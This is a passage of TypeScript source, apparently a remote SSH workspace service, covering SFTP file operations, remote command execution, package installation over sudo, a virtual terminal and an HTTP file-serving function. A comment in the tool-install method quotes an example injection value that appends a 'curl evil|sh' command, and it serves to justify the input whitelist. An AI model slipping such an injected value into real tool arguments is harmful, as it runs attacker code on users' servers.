		const arch = sysLines[1] || "Unknown";
		const hostname = sysLines[2] || "";
		const user = sysLines[3] || "";
		const homeDir = sysLines[4] || "/";
		const cores = parseInt(sysLines[5] || "1", 10) || 1;
		const totalMemMb = parseInt(sysLines[6] || "0", 10) || 0;

		const gitLines = (sections["GIT"] || []).filter(Boolean);
		const gitInstalled = gitLines.length > 0 && gitLines[0] !== "NONE";
		const gitVersion = gitInstalled ? gitLines.join(" ") : undefined;

		const nodeLines = (sections["NODE"] || []).filter(Boolean);
		const nodeInstalled = nodeLines.length > 0 && nodeLines[0] !== "NONE";
		const nodeVersion = nodeInstalled ? nodeLines.join(" ") : undefined;

		const bashLines = (sections["BASH"] || []).filter(Boolean);
		const bashInstalled = bashLines.length > 0 && bashLines[0] !== "NONE";
		const bashPath = bashInstalled ? bashLines[0] : undefined;

		const pyLines = (sections["PYTHON"] || []).filter(Boolean);
		const pyInstalled = pyLines.length > 0 && pyLines[0] !== "NONE";
		const pyVersion = pyInstalled ? pyLines.join(" ") : undefined;

		const pkgLines = (sections["PKG"] || []).filter(Boolean);
		const packageManager = pkgLines[0] || "unknown";

		const suggestedInstall: string[] = [];
		if (!gitInstalled) suggestedInstall.push("git");
		if (!bashInstalled) suggestedInstall.push("bash");

		return {
			system: {
				os: osName,
				arch,
				hostname,
				user,
				homeDir,
				cores,
				totalMemMb,
			},
			tools: {
				git: { installed: gitInstalled, version: gitVersion },
				node: { installed: nodeInstalled, version: nodeVersion },
				bash: { installed: bashInstalled, path: bashPath },
				python: { installed: pyInstalled, version: pyVersion },
			},
			packageManager,
			suggestedInstall,
		};
	}

	/** 取得指定连接并重置其空闲计时器 */
	private getConnection(connectionId: string): ActiveConnection {
		const conn = this.connections.get(connectionId);
		if (!conn || !conn.alive) {
			throw new Error(`连接已断开或不存在 (ID: ${connectionId})，请重新发起探针连接`);
		}
		this.refreshConnectionTimer(conn);
		return conn;
	}

	/**
	 * 按 host/port/username 获取存活连接；若已断开或服务刚重启，自动从缓存或 ssh-profiles.json
	 * 提取加密保存的凭据重连（并发请求单飞合并）。
	 */
	async getOrConnectHost(host: string, port: number, username: string): Promise<ActiveConnection> {
		const hostKey = `${username}@${host}:${port}`;
		const existingId = this.hostConnections.get(hostKey);
		if (existingId) {
			const conn = this.connections.get(existingId);
			if (conn && conn.alive) {
				this.refreshConnectionTimer(conn);
				return conn;
			}
		}

		const inflight = this.inflightConnects.get(hostKey);
		if (inflight) return inflight;

		const run = (async (): Promise<ActiveConnection> => {
			let params = this.credentialCache.get(hostKey);
			if (!params) {
				const data = await this.loadProfilesData();
				const profile = Object.values(data.profiles).find(
					(p) => p.host === host && (p.port || 22) === port && p.username === username,
				);
				if (profile) {
					if (profile.authType === "password") {
						const password = (await this.unseal(profile.encryptedPassword)) ?? "";
						params = { host, port, username, auth: { type: "password", password } };
					} else if (profile.authType === "key") {
						const passphrase = await this.unseal(profile.encryptedPassphrase);
						params = {
							host,
							port,
							username,
							auth: { type: "key", privateKeyPath: profile.privateKeyPath, passphrase },
						};
					} else {
						params = { host, port, username, auth: { type: "agent" } };
					}
				} else {
					// 回退尝试默认 SSH 密钥
					params = { host, port, username, auth: { type: "key" } };
				}
			}

			const { client, hydrated } = await this.createClient(params);
			return this.registerConnection(client, hydrated);
		})();

		this.inflightConnects.set(hostKey, run);
		try {
			return await run;
		} finally {
			this.inflightConnects.delete(hostKey);
		}
	}

	/** 按远程工作区 URI 获取活跃连接与 SFTP 会话 */
	async getOrConnectByUri(uri: string): Promise<{
		conn: ActiveConnection;
		sftp: SFTPWrapper;
		parsed: ParsedRemoteUri;
	}> {
		const parsed = parseRemoteWorkspaceUri(uri);
		if (!parsed) {
			throw new Error(`无效的远程工作区 URI: ${uri}`);
		}
		const conn = await this.getOrConnectHost(parsed.host, parsed.port, parsed.username);
		const sftp = await this.getSftp(conn);
		return { conn, sftp, parsed };
	}

	/** 获取 SFTP 会话（单飞：并发首调共享同一条在途通道，不重复开） */
	private async getSftp(conn: ActiveConnection): Promise<SFTPWrapper> {
		if (conn.sftp) return conn.sftp;
		if (!conn.sftpInflight) {
			const promise = new Promise<SFTPWrapper>((resolve, reject) => {
				conn.client.sftp((err, sftp) => {
					if (err) return reject(err);
					sftp.once("close", () => {
						if (conn.sftp === sftp) conn.sftp = undefined;
					});
					sftp.once("end", () => {
						if (conn.sftp === sftp) conn.sftp = undefined;
					});
					conn.sftp = sftp;
					resolve(sftp);
				});
			});
			conn.sftpInflight = promise;
			promise.finally(() => {
				if (conn.sftpInflight === promise) conn.sftpInflight = undefined;
			});
		}
		return conn.sftpInflight;
	}

	/** 浏览远程目录 */
	async listDir(
		connectionId: string,
		reqPath?: string,
	): Promise<{
		ok: boolean;
		connectionId: string;
		path: string;
		parentPath?: string | null;
		items: RemoteSshDirItem[];
		error?: string;
	}> {
		let conn: ActiveConnection;
		try {
			conn = this.getConnection(connectionId);
		} catch (err) {
			return {
				ok: false,
				connectionId,
				path: reqPath || "/",
				items: [],
				error: (err as Error).message,
			};
		}

		try {
			const sftp = await this.getSftp(conn);
			const homeDir = conn.system?.homeDir || "/";
			let rawTarget = (reqPath && reqPath.trim()) || homeDir;
			if (rawTarget === "~") {
				rawTarget = homeDir;
			} else if (rawTarget.startsWith("~/") || rawTarget.startsWith("~\\")) {
				rawTarget = path.posix.join(homeDir, rawTarget.slice(2).replace(/\\/g, "/"));
			}
			const normTarget = path.posix.normalize(rawTarget.replace(/\\/g, "/"));
			const targetPath = normTarget !== "/" ? normTarget.replace(/\/+$/, "") || "/" : "/";

			return await new Promise((resolve) => {
				sftp.readdir(targetPath, async (err, list) => {
					if (err) {
						return resolve({
							ok: false,
							connectionId,
							path: targetPath,
							items: [],
							error: `无法读取远程目录 ${targetPath}: ${err.message}`,
						});
					}

					const items: RemoteSshDirItem[] = [];
					for (const item of list) {
						if (item.filename === "." || item.filename === "..") continue;
						const fullPath =
							targetPath === "/" ? `/${item.filename}` : `${targetPath.replace(/\/+$/, "")}/${item.filename}`;
						let isDir = Boolean(item.attrs.isDirectory?.());
						const isSymlink =
							typeof item.attrs.isSymbolicLink === "function"
								? Boolean(item.attrs.isSymbolicLink())
								: ((item.attrs.mode ?? 0) & 0o170000) === 0o120000;
						if (!isDir && isSymlink && typeof sftp.stat === "function") {
							try {
								const st = await new Promise<import("ssh2").Stats>((resStat, rejStat) => {
									sftp.stat(fullPath, (stErr, stats) => (stErr ? rejStat(stErr) : resStat(stats)));
								});
								isDir = Boolean(st?.isDirectory?.());
							} catch {
								isDir = false;
							}
						}
						items.push({
							name: item.filename,
							path: fullPath,
							type: isDir ? "dir" : "file",
							size: item.attrs.size,
							mtime: item.attrs.mtime ? item.attrs.mtime * 1000 : undefined,
						});
					}

					items.sort((a, b) => {
						if (a.type !== b.type) {
							return a.type === "dir" ? -1 : 1;
						}
						return a.name.localeCompare(b.name);
					});

					let parentPath: string | null = null;
					if (targetPath !== "/" && targetPath !== "") {
						const idx = targetPath.lastIndexOf("/");
						parentPath = idx <= 0 ? "/" : targetPath.slice(0, idx);
					}

					resolve({
						ok: true,
						connectionId,
						path: targetPath,
						parentPath,
						items,
					});
				});
			});
		} catch (err) {
			return {
				ok: false,
				connectionId,
				path: reqPath || "/",
				items: [],
				error: (err as Error).message,
			};
		}
	}

	/** 在远端执行工具一键安装 */
	async installTools(
		connectionId: string,
		tools: string[],
	): Promise<{
		ok: boolean;
		connectionId: string;
		tool: string;
		output?: string;
		error?: string;
	}> {
		const requested = tools[0] || "git";
		// 工具名直接拼进远端 root/sudo shell：白名单字符集 + shell 引用双保险，
		// 否则 tools:["git; curl evil|sh"] 即在用户 SSH 服务器上执行任意命令。
		// 放在 getConnection 之前：非法名字无需连接即可快速失败。
		if (!/^[a-zA-Z][a-zA-Z0-9._+-]{0,63}$/.test(requested)) {
			return { ok: false, connectionId, tool: requested, error: `非法的工具名：${requested}` };
		}
		const conn = this.getConnection(connectionId);
		const tool = shellQuotePosix(requested);

		const installScript = `
if command -v apt-get >/dev/null 2>&1; then
  export DEBIAN_FRONTEND=noninteractive
  ( [ "$(id -u)" -eq 0 ] && apt-get update -y && apt-get install -y ${tool} ) || ( sudo -n apt-get update -y && sudo -n apt-get install -y ${tool} )
elif command -v dnf >/dev/null 2>&1; then
  ( [ "$(id -u)" -eq 0 ] && dnf install -y ${tool} ) || sudo -n dnf install -y ${tool}
elif command -v yum >/dev/null 2>&1; then
  ( [ "$(id -u)" -eq 0 ] && yum install -y ${tool} ) || sudo -n yum install -y ${tool}
elif command -v apk >/dev/null 2>&1; then
  ( [ "$(id -u)" -eq 0 ] && apk add ${tool} ) || sudo -n apk add ${tool}
elif command -v pacman >/dev/null 2>&1; then
  ( [ "$(id -u)" -eq 0 ] && pacman -S --noconfirm ${tool} ) || sudo -n pacman -S --noconfirm ${tool}
elif command -v brew >/dev/null 2>&1; then
  brew install ${tool}
else
  echo "未检测到支持的包管理器 (apt/dnf/yum/apk/pacman/brew)，请手动安装 ${tool}"
  exit 1
fi
`;

		try {
			const output = await this.execCommand(conn.client, installScript);
			const verifyOutput = await this.execCommand(conn.client, `which ${tool} 2>/dev/null`);
			const installed = Boolean(verifyOutput.trim());

			return {
				ok: installed,
				connectionId,
				tool: requested,
				output,
				error: installed ? undefined : `执行完成但未检测到 ${tool} 二进制文件，可能需要 sudo 密码权限`,
			};
		} catch (err) {
			return {
				ok: false,
				connectionId,
				tool: requested,
				error: (err as Error).message,
			};
		}
	}

	// =========================================================================
	// 面向远程工作区 (ssh://...) 的文件、命令与终端操作 API
	// =========================================================================

	/** 在远程工作区执行 Shell 命令（支持流式输出回调、超时与 AbortSignal） */
	async execInWorkspace(
		uri: string,
		command: string,
		opts?: {
			cwd?: string;
			timeoutMs?: number;
			signal?: AbortSignal;
			onData?: (chunk: Buffer) => void;
		},
	): Promise<{ stdout: string; stderr: string; exitCode: number }> {
		return new Promise((resolve, reject) => {
			let stream: ClientChannel | undefined;
			let stdout = "";
			let stderr = "";
			let settled = false;
			let timer: NodeJS.Timeout | undefined;
			const signal = opts?.signal;
			const finish = (exitCode: number, error?: unknown) => {
				if (settled) return;
				settled = true;
				clearTimeout(timer);
				signal?.removeEventListener("abort", onAbort);
				if (error) reject(error);
				else resolve({ stdout, stderr, exitCode });
			};
			const closeChannel = (channel: ClientChannel, killSignal: "TERM" | "KILL") => {
				// Closing must still happen when the remote rejects the signal request.
				try {
					channel.signal(killSignal);
				} catch {}
				try {
					channel.close();
				} catch {}
			};
			const onAbort = () => {
				// Settle before closing: close() may synchronously emit a successful exit.
				finish(130, signal?.reason instanceof Error ? signal.reason : new Error("Command aborted"));
				if (stream) closeChannel(stream, "TERM");
			};
			signal?.addEventListener("abort", onAbort, { once: true });
			if (signal?.aborted) return onAbort();

			// The connection is pooled/shared: abort this operation, not other users' connections.
			void this.getOrConnectByUri(uri)
				.then(({ conn, parsed }) => {
					if (settled) return;
					if (signal?.aborted) return onAbort();
					const targetDir = opts?.cwd || parsed.remotePath || "/";
					const fullCmd = `cd ${shellQuotePosix(targetDir)} && ${command}`;
					conn.client.exec(fullCmd, (err, channel) => {
						if (err) return finish(1, err);
						stream = channel;
						// Keep an error handler even on a late channel, including during close().
						channel.on("error", (error: Error) => finish(1, error));
						if (settled || signal?.aborted) {
							if (!settled) onAbort();
							else closeChannel(channel, "TERM");
							return;
						}
						if (opts?.timeoutMs && opts.timeoutMs > 0) {
							timer = setTimeout(() => {
								finish(124, new Error(`Command timed out after ${opts.timeoutMs}ms`));
								closeChannel(channel, "KILL");
							}, opts.timeoutMs);
						}
						channel.on("data", (chunk: Buffer) => {
							if (settled) return;
							stdout += chunk.toString("utf8");
							opts?.onData?.(chunk);
						});
						channel.stderr.on("data", (chunk: Buffer) => {
							if (settled) return;
							stderr += chunk.toString("utf8");
							opts?.onData?.(chunk);
						});
						channel.on("close", (code: number | null) => {
							if (typeof code === "number") finish(code);
							else
								finish(
									1,
									new Error("Remote command terminated without an exit code (connection lost or process killed)"),
								);
						});
					});
				})
				.catch((error: unknown) => finish(1, error));
		});
	}

	/** SFTP stat（跟随软链） */
	async sftpStat(
		uri: string,
		remoteAbsPath: string,
	): Promise<{ isDirectory: boolean; isFile: boolean; size: number; mtime: number }> {
		const { sftp } = await this.getOrConnectByUri(uri);
		return new Promise((resolve, reject) => {
			sftp.stat(remoteAbsPath, (err, stats) => {
				if (err) return reject(err);
				resolve({
					isDirectory: Boolean(stats.isDirectory()),
					isFile: Boolean(stats.isFile()),
					size: stats.size ?? 0,
					mtime: (stats.mtime ?? 0) * 1000,
				});
			});
		});
	}

	/** SFTP readdir（跟随符号链接判断目录） */
	async sftpReaddir(
		uri: string,
		remoteAbsPath: string,
	): Promise<Array<{ name: string; type: "dir" | "file"; size: number; mtime: number }>> {
		const { sftp } = await this.getOrConnectByUri(uri);
		const list = await new Promise<import("ssh2").FileEntryWithStats[]>((resolve, reject) => {
			sftp.readdir(remoteAbsPath, (err, entries) => {
				if (err) return reject(err);
				resolve(entries || []);
			});
		});

		const out: Array<{ name: string; type: "dir" | "file"; size: number; mtime: number }> = [];
		for (const item of list) {
			if (item.filename === "." || item.filename === "..") continue;
			let isDir = Boolean(item.attrs.isDirectory?.());
			const isSymlink =
				typeof item.attrs.isSymbolicLink === "function"
					? Boolean(item.attrs.isSymbolicLink())
					: ((item.attrs.mode ?? 0) & 0o170000) === 0o120000;
			if (!isDir && isSymlink) {
				try {
					const target = path.posix.join(remoteAbsPath, item.filename);
					const st = await this.sftpStat(uri, target);
					isDir = st.isDirectory;
				} catch {
					isDir = false;
				}
			}
			out.push({
				name: item.filename,
				type: isDir ? "dir" : "file",
				size: item.attrs.size ?? 0,
				mtime: (item.attrs.mtime ?? 0) * 1000,
			});
		}
		return out;
	}

	/** SFTP 创建远程文件读取流（供 HTTP 下载与媒体流式预览使用） */
	async sftpCreateReadStream(
		uri: string,
		remoteAbsPath: string,
		opts?: { start?: number; end?: number },
	): Promise<NodeJS.ReadableStream> {
		const { sftp } = await this.getOrConnectByUri(uri);
		if (typeof sftp.createReadStream === "function") {
			return sftp.createReadStream(remoteAbsPath, opts);
		}
		// 回退路径：整文件读进内存再切片。必须设上限——不支持 createReadStream 的
		// 实现（基本只有测试 mock）遇到 GB 级文件会直接打爆内存（OOM）。
		const MAX_FALLBACK_BYTES = 512 * 1024 * 1024;
		const capEnd = opts?.end !== undefined ? Math.min(opts.end, MAX_FALLBACK_BYTES - 1) : MAX_FALLBACK_BYTES - 1;
		const { data } = await this.sftpReadFile(uri, remoteAbsPath, MAX_FALLBACK_BYTES);
		const sliceStart = opts?.start ?? 0;
		const sliceEnd = capEnd;
		const slice =
			sliceStart > 0 || sliceEnd < MAX_FALLBACK_BYTES - 1 || data.length === MAX_FALLBACK_BYTES
				? data.subarray(sliceStart, sliceEnd + 1)
				: data;
		return Readable.from(slice);
	}

	/** SFTP 读取远程文件 Buffer（可选限制最大读取字节数） */
	async sftpReadFile(uri: string, remoteAbsPath: string, maxBytes?: number): Promise<{ data: Buffer; size: number }> {
		const { sftp } = await this.getOrConnectByUri(uri);
		const st = await this.sftpStat(uri, remoteAbsPath);
		if (!st.isFile) {
			const err = new Error(`Not a file: ${remoteAbsPath}`) as NodeJS.ErrnoException;
			err.code = "EISDIR";
			throw err;
		}
		const toRead = maxBytes !== undefined ? Math.min(st.size, maxBytes) : st.size;
		if (toRead <= 0) {
			return { data: Buffer.alloc(0), size: st.size };
		}

		return new Promise((resolve, reject) => {
			const chunks: Buffer[] = [];
			const stream = sftp.createReadStream(remoteAbsPath, { start: 0, end: toRead - 1 });
			stream.on("data", (chunk: Buffer) => chunks.push(chunk));
			stream.on("error", (err: Error) => reject(err));
			stream.on("end", () => {
				resolve({ data: Buffer.concat(chunks), size: st.size });
			});
		});
	}

	/** SFTP 写入远程文件 */
	async sftpWriteFile(
		uri: string,
		remoteAbsPath: string,
		content: Buffer | string,
		opts?: { createParents?: boolean; flag?: string; signal?: AbortSignal; timeoutMs?: number },
	): Promise<void> {
		const signal = opts?.signal;
		const timeoutMs = opts?.timeoutMs ?? 30_000;
		signal?.throwIfAborted();
		if (opts?.createParents) {
			const parentDir = path.posix.dirname(remoteAbsPath);
			if (parentDir && parentDir !== "/") {
				signal?.throwIfAborted();
				const res = await this.execInWorkspace(uri, `mkdir -p ${shellQuotePosix(parentDir)}`, {
					cwd: "/",
					signal,
					timeoutMs,
				});
				signal?.throwIfAborted();
				if (res.exitCode !== 0) {
					throw new Error(res.stderr || res.stdout || `Remote mkdir failed for ${parentDir}`);
				}
			}
		}
		signal?.throwIfAborted();
		const { sftp } = await this.getOrConnectByUri(uri);
		signal?.throwIfAborted();
		const buf = typeof content === "string" ? Buffer.from(content, "utf8") : content;
		return new Promise((resolve, reject) => {
			const stream = sftp.createWriteStream(remoteAbsPath, opts?.flag ? { flags: opts.flag as any } : undefined);
			// ssh2 disables Node's close emission and omits its own close on errors.
			// Restore it so even failed _destroy callbacks signal resource release.
			const state = (
				stream as typeof stream & {
					_writableState?: { emitClose: boolean; finalCalled?: boolean };
				}
			)._writableState;
			if (state) state.emitClose = true;
			let failure: unknown;
			let failed = false;
			let finished = false;
			let settled = false;
			let timer: NodeJS.Timeout | undefined;
			const stop = (error: unknown) => {
				if (settled) return;
				if (!failed) {
					failed = true;
					failure = error;
				}
				stream.destroy();
			};
			const abort = () => stop(signal?.reason ?? new Error("SFTP write aborted"));
			// ssh2's SFTP WriteStream calls `destroy()` from inside `_final`, so Writable never emits
			// `finish` (proved by instrumenting the real stream: only `close` arrives, after the SFTP
			// CLOSE acknowledgement). Completion is therefore decided by `close` _after_ `_final` ran:
			// `_final` only runs once every WRITE has been acknowledged, so `finalCalled` means flushed.
			const flushed = () => !!state?.finalCalled || stream.writableFinished;
			const settle = (error?: unknown) => {
				if (settled) return;
				settled = true;
				clearTimeout(timer);
				signal?.removeEventListener("abort", abort);
				if (failed) reject(failure);
				else if (error) reject(error);
				else resolve();
			};
			// Keep this listener after close as ssh2 may still report a late error.
			stream.on("error", stop);
			// Recorded only: `close` stays the completion signal, since a bare `finish` does not prove
			// the SFTP CLOSE acknowledgement (durable flush) ever arrived.
			stream.on("finish", () => {
				finished = true;
			});
			stream.on("close", () => {
				queueMicrotask(() => {
					if (settled) return;
					if (failed) return settle();
					settle(finished || flushed() ? undefined : new Error("SFTP write closed before finishing"));
				});
			});
			signal?.addEventListener("abort", abort, { once: true });
			if (signal?.aborted) {
				abort();
				return;
			}
			timer = setTimeout(() => stop(new Error(`SFTP write timed out after ${timeoutMs}ms`)), timeoutMs);
			try {
				stream.end(buf);
			} catch (error) {
				stop(error);
			}
		});
	}

	/** 递归创建远程目录 (mkdir -p) */
	async sftpMkdirRecursive(uri: string, remoteAbsPath: string): Promise<void> {
		const res = await this.execInWorkspace(uri, `mkdir -p ${shellQuotePosix(remoteAbsPath)}`, { cwd: "/" });
		if (res.exitCode !== 0) {
			throw new Error(res.stderr || res.stdout || `Remote mkdir failed for ${remoteAbsPath}`);
		}
	}

	/** 重命名或移动远程文件/目录 */
	async sftpRename(uri: string, oldRemoteAbs: string, newRemoteAbs: string): Promise<void> {
		const { sftp } = await this.getOrConnectByUri(uri);
		return new Promise((resolve, reject) => {
			sftp.rename(oldRemoteAbs, newRemoteAbs, (err) => {
				if (err) return reject(err);
				resolve();
			});
		});
	}

	/** 删除远程文件或目录 (rm -rf) */
	async sftpRemove(uri: string, remoteAbsPath: string): Promise<void> {
		if (!remoteAbsPath || remoteAbsPath === "/") {
			throw new Error("Refusing to remove root directory");
		}
		// 与 sftpCopy 同口径：退出码非 0 必须抛错，否则权限不足/目录被占用时
		// files-service 仍会向用户广播「已删除」
		const res = await this.execInWorkspace(uri, `rm -rf ${shellQuotePosix(remoteAbsPath)}`, { cwd: "/" });
		if (res.exitCode !== 0) {
			throw new Error(res.stderr || res.stdout || `Remote remove failed for ${remoteAbsPath}`);
		}
	}

	/** 复制或移动远程文件/目录 */
	async sftpCopy(uri: string, srcRemoteAbs: string, destRemoteAbs: string, move?: boolean): Promise<void> {
		const cmd = move
			? `mv ${shellQuotePosix(srcRemoteAbs)} ${shellQuotePosix(destRemoteAbs)}`
			: `cp -R ${shellQuotePosix(srcRemoteAbs)} ${shellQuotePosix(destRemoteAbs)}`;
		const res = await this.execInWorkspace(uri, cmd, { cwd: "/" });
		if (res.exitCode !== 0) {
			throw new Error(res.stderr || res.stdout || "Remote copy/move failed");
		}
	}

	/**
	 * 为内置终端（terminals.ts）创建基于 ssh2 Channel 的虚拟 IPty 实例。
	 * 直接复用已鉴权（含密码/私钥）的 SSH 连接开启交互式 PTY Shell，100% 免二次输入密码。
	 */
	createVirtualPty(uri: string, cols: number, rows: number): import("node-pty").IPty {
		const dataListeners: Array<(data: string) => void> = [];
		const exitListeners: Array<(e: { exitCode: number; signal?: number }) => void> = [];
		let channel: ClientChannel | null = null;
		let pendingWrites: string[] = [];
		let currentCols = Math.max(2, Math.floor(cols) || 80);
		let currentRows = Math.max(2, Math.floor(rows) || 24);
		let killed = false;

		const emitData = (str: string) => {
			for (const fn of dataListeners) {
				try {
					fn(str);
				} catch {}
			}
		};
		const emitExit = (exitCode: number) => {
			for (const fn of exitListeners) {
				try {
					fn({ exitCode });
				} catch {}
			}
		};

		void (async () => {
			try {
				const { conn, parsed } = await this.getOrConnectByUri(uri);
				if (killed) return;
				conn.client.shell(
					{
						term: "xterm-256color",
						cols: currentCols,
						rows: currentRows,
					},
					(err, stream) => {
						if (err || killed) {
							if (err) emitData(`\r\n[SSH Terminal Error: ${err.message}]\r\n`);
							if (killed && !err) {
								// 握手完成前已被 kill：必须关掉已打开的 shell channel，
								// 否则远端 PTY 里的登录 shell 一直跑到整条连接断开才回收
								try {
									stream.close();
								} catch {}
							}
							emitExit(1);
							return;
						}
						channel = stream;
						stream.on("data", (chunk: Buffer) => {
							emitData(chunk.toString("utf8"));
						});
						stream.stderr.on("data", (chunk: Buffer) => {
							emitData(chunk.toString("utf8"));
						});
						stream.on("close", (code: number) => {
							channel = null;
							emitExit(typeof code === "number" ? code : 0);
						});
						// 自动进入远程项目工作目录
						if (parsed.remotePath && parsed.remotePath !== "~") {
							stream.write(`cd ${shellQuotePosix(parsed.remotePath)} && clear\r`);
						}
						if (pendingWrites.length > 0) {
							for (const w of pendingWrites) stream.write(w);
							pendingWrites = [];
						}
					},
				);
			} catch (err) {
				emitData(`\r\n[Failed to connect remote SSH terminal: ${(err as Error).message}]\r\n`);
				emitExit(1);
			}
		})();

		const virtualPty: import("node-pty").IPty = {
			pid: Math.floor(10000 + Math.random() * 80000),
			cols: currentCols,
			rows: currentRows,
			process: "ssh-remote",
			handleFlowControl: false,
			onData(listener: (e: string) => any) {
				dataListeners.push(listener);
				return {
					dispose: () => {
						const idx = dataListeners.indexOf(listener);
						if (idx >= 0) dataListeners.splice(idx, 1);
					},
				};
			},
			onExit(listener: (e: { exitCode: number; signal?: number }) => any) {
				exitListeners.push(listener);
				return {
					dispose: () => {
						const idx = exitListeners.indexOf(listener);
						if (idx >= 0) exitListeners.splice(idx, 1);
					},
				};
			},
			write(data: string) {
				if (killed) return;
				if (channel) {
					channel.write(data);
				} else {
					pendingWrites.push(data);
				}
			},
			resize(newCols: number, newRows: number) {
				currentCols = Math.max(2, Math.floor(newCols) || 80);
				currentRows = Math.max(2, Math.floor(newRows) || 24);
				if (channel) {
					try {
						channel.setWindow(currentRows, currentCols, 0, 0);
					} catch {}
				}
			},
			clear() {},
			kill(_signal?: string) {
				if (killed) return;
				killed = true;
				if (channel) {
					try {
						channel.close();
					} catch {}
					channel = null;
				}
			},
			pause() {
				channel?.pause();
			},
			resume() {
				channel?.resume();
			},
		};
		return virtualPty;
	}

	/**
	 * 为目标主机打开交互式 PTY Shell 通道（返回底层 ClientChannel 流与连接）
	 */
	async openShell(
		target: { host: string; port?: number; username: string; remotePath?: string },
		options: { cols?: number; rows?: number; term?: string } = {},
	): Promise<{
		stream: ClientChannel;
		conn: ActiveConnection;
		close: () => void;
	}> {
		const port = target.port ?? 22;
		const conn = await this.getOrConnectHost(target.host, port, target.username);
		return new Promise((resolve, reject) => {
			conn.client.shell(
				{
					term: options.term ?? "xterm-256color",
					cols: Math.max(2, Math.floor(options.cols ?? 80)),
					rows: Math.max(2, Math.floor(options.rows ?? 24)),
				},
				(err, stream) => {
					if (err) return reject(err);
					if (target.remotePath && target.remotePath !== "~") {
						stream.write(`cd ${shellQuotePosix(target.remotePath)} && clear\r`);
					}
					resolve({
						stream,
						conn,
						close: () => {
							try {
								stream.close();
							} catch {}
						},
					});
				},
			);
		});
	}
}

/**
 * 通过 SFTP 流式响应远程工作区文件的 HTTP 下载与媒体/HTML 预览请求（/api/file 与 /api/preview）。
 */
export async function serveRemoteWorkspaceFile(
	req: {
		headers?: Record<string, string | string[] | undefined>;
		query?: Record<string, unknown>;
		on?: (event: string, listener: () => void) => unknown;
	},
	res: {
		status: (code: number) => any;
		setHeader: (name: string, value: string) => unknown;
		type?: (name: string) => unknown;
		end: (chunk?: any) => unknown;
		destroy?: () => unknown;
		headersSent?: boolean;
	} & NodeJS.WritableStream,
	root: string,
	rawPath: string,
	opts: { isDownload: boolean; allowAllTypes: boolean },
	sshServiceOverride?: RemoteSshService | null,
): Promise<void> {
	const parsed = parseRemoteWorkspaceUri(root);
	const sshSvc = sshServiceOverride ?? getGlobalRemoteSshService();
	if (!parsed || !sshSvc) {
		res.status(404).end("not found");
		return;
	}
	const trimmed = rawPath.trim();
	let remoteAbs: string;
	if (trimmed.startsWith("/")) {
		remoteAbs = path.posix.normalize(trimmed);
		if (remoteAbs === "/") {
			res.status(400).end("not a file");
			return;
		}
	} else {
		const w = resolveRemoteWorkspacePath(parsed.remotePath, trimmed);
		if (!w || w.rel === "") {
			res.status(400).end("path outside workspace");
			return;
		}
		remoteAbs = w.abs;
	}
	const name = path.posix.basename(remoteAbs);
	const kind = previewKind(name);
	const lower = name.toLowerCase();
	const isHtmlPreview = lower.endsWith(".html") || lower.endsWith(".htm") || lower.endsWith(".xhtml");
	const isAudioPreview = isAudioFile(name);
	if (
		!opts.isDownload &&
		!opts.allowAllTypes &&
		kind !== "image" &&
		kind !== "video" &&
		!isHtmlPreview &&
		!isAudioPreview
	) {
		res.status(400).end("not a previewable media file");
		return;
	}
	const st = await sshSvc.sftpStat(root, remoteAbs);
	if (!st.isFile) {
		res.status(400).end("not a file");
		return;
	}

	res.type?.(name);
	if (opts.isDownload) {
		const asciiFallback = name.replace(/[^\x20-\x7e]|["\\]/g, "_");
		const encoded = encodeURIComponent(name).replace(
			/['()*]/g,
			(c) => `%${c.charCodeAt(0).toString(16).toUpperCase()}`,
		);
		res.setHeader("Content-Disposition", `attachment; filename="${asciiFallback}"; filename*=UTF-8''${encoded}`);
	} else {
		res.setHeader("X-Content-Type-Options", "nosniff");
		if (isHtmlPreview) {
			const allowJs = req.query?.allowJs === "1";
			res.setHeader("Content-Security-Policy", allowJs ? "sandbox allow-scripts" : "sandbox");
		} else if (lower.endsWith(".svg")) {
			res.setHeader("Content-Security-Policy", "sandbox");
		}
	}

	const rangeHeader = typeof req.headers?.range === "string" ? req.headers.range : "";
	let streamOpts: { start?: number; end?: number } | undefined;
	if (!opts.isDownload && rangeHeader && st.size > 0 && /^bytes=\d*-\d*$/.test(rangeHeader)) {
		const [startStr, endStr] = rangeHeader.slice(6).split("-");
		let start = startStr ? parseInt(startStr, 10) : 0;
		let end = endStr ? parseInt(endStr, 10) : st.size - 1;
		if (!startStr && endStr) {
			start = Math.max(0, st.size - parseInt(endStr, 10));
			end = st.size - 1;
		}
		if (start >= st.size || start > end || start < 0) {
			res.status(416);
			res.setHeader("Content-Range", `bytes */${st.size}`);
			res.end();
			return;
		}
		end = Math.min(end, st.size - 1);
		res.status(206);
		res.setHeader("Accept-Ranges", "bytes");
		res.setHeader("Content-Range", `bytes ${start}-${end}/${st.size}`);
		res.setHeader("Content-Length", String(end - start + 1));
		streamOpts = { start, end };
	} else {
		res.setHeader("Accept-Ranges", "bytes");
		res.setHeader("Content-Length", String(st.size));
		if (st.size === 0) {
			res.end();
			return;
		}
	}

	const stream = await sshSvc.sftpCreateReadStream(root, remoteAbs, streamOpts);
	await new Promise<void>((resolveStream) => {
		stream.on("error", () => {
			if (!res.headersSent) res.status(404).end("not found");
			else res.destroy?.();
			resolveStream();
		});
		res.on("finish", () => resolveStream());
		res.on("close", () => resolveStream());
		req.on?.("close", () => {
			if ("destroy" in stream && typeof (stream as { destroy?: () => void }).destroy === "function") {
				(stream as { destroy: () => void }).destroy();
			}
			resolveStream();
		});
		stream.pipe(res);
	});
}
